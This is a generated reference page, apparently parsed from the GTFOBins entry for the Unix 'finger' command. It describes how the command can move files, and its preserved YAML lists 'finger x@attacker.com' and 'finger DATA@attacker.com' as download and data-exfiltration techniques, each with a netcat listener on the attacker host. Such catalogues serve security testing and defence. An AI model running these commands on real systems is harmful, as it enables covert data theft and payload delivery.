---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# finger

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `finger` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/finger` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [finger](../../tools/linux/finger.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | finger |
| name | finger |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/finger/ |

## Preserved Source Material

```yaml
_body: ''
_name: finger
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/finger
functions:
  download:
  - code: finger x@attacker.com
    comment: The command hangs waiting for the remote peer to close the socket.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender:
      code: nc -l -p 79 </path/to/input-file
      comment: A TCP server can be used on the attacker box to send the data.
  upload:
  - code: finger DATA@attacker.com
    comment: The command hangs waiting for the remote peer to close the socket.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver:
      code: nc -l -p 79 >/path/to/output-file
      comment: A TCP server can be used on the attacker box to receive the data.
```
